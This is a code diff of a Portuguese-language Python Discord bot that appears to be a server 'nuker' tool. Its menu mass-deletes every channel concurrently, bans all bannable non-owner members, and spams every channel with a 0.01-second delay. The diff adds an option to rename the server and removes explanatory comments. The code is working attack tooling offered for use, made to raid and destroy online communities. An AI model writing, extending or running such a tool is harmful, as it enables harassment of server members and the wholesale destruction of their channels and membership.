@@ -7,7 +7,6 @@ from colorama import Fore, Style
 colorama.init(autoreset=True)
 
 # --- Configuração de Velocidade (Estilo INFZRNAL) ---
-# O semáforo permite até 50 tarefas simultâneas (o limite seguro para não levar crash)
 semaphore = asyncio.Semaphore(50)
 
 # Configuração de intenções
@@ -33,8 +32,8 @@ MENU = f"""{Fore.BLUE}
 ├───────────────────┼───────────────────┤
 │ (2) Criar Canais  │ (4) Spam Global   │
 ├───────────────────┴───────────────────┤
-│              (5) Sair                 │
-└───────────────────────────────────────┘
+│ (5) Mudar Nome SV │ (6) Sair          │
+└───────────────────┴───────────────────┘
 """
 
 # --- Funções de Ação (Lógica de Alta Velocidade) ---
@@ -46,9 +45,7 @@ async def deletar_canal_task(channel):
 
 async def excluir_canais(guild):
     print(f"{Fore.RED}[!] A apagar todos os canais em massa...")
-    # Cria uma lista de tarefas para todos os canais
     tasks = [deletar_canal_task(ch) for ch in guild.channels]
-    # Executa todas ao mesmo tempo (Gather)
     await asyncio.gather(*tasks)
     print(f"{Fore.GREEN}[+] Canais limpos com velocidade turbo.")
 
@@ -67,23 +64,30 @@ async def criar_canais(guild):
 
 async def banir_membro_task(member):
     async with semaphore:
-        try: await member.ban(reason="PAINEL 188 TURBO")
+        try: await member.ban(reason="PAINEL 188 ¿")
         except: pass
 
 async def banir_todos(guild):
     print(f"{Fore.RED}[!] A banir membros em massa...")
-    # Filtra membros que podem ser banidos
     membros = [m for m in guild.members if m.top_role < guild.me.top_role and m != guild.owner and not m.bot]
     tasks = [banir_membro_task(m) for m in membros]
     await asyncio.gather(*tasks)
     print(f"{Fore.GREEN}[+] Banimento em massa finalizado.")
+
+async def mudar_nome_sv(guild):
+    novo_nome = input(f"{Fore.CYAN}Digite o novo nome do Servidor: ")
+    try:
+        await guild.edit(name=novo_nome)
+        print(f"{Fore.GREEN}[+] Nome do servidor alterado para: {novo_nome}")
+    except Exception as e:
+        print(f"{Fore.RED}[X] Erro ao mudar nome: {e}")
 
 async def spam_canal_task(canal, conteudo, repeticoes):
     async with semaphore:
         for _ in range(repeticoes):
             try: 
                 await canal.send(conteudo)
-                await asyncio.sleep(0.01) # Delay mínimo para não travar a conexão
+                await asyncio.sleep(0.01) 
             except: break
 
 async def spam_todos_canais(guild):
@@ -125,6 +129,8 @@ async def on_ready():
         elif op == "4":
             await spam_todos_canais(guild)
         elif op == "5":
+            await mudar_nome_sv(guild)
+        elif op == "6":
             print(f"{Fore.RED}A desligar..."); await client.close(); break
         else:
             print(f"{Fore.YELLOW}Opção inválida!")
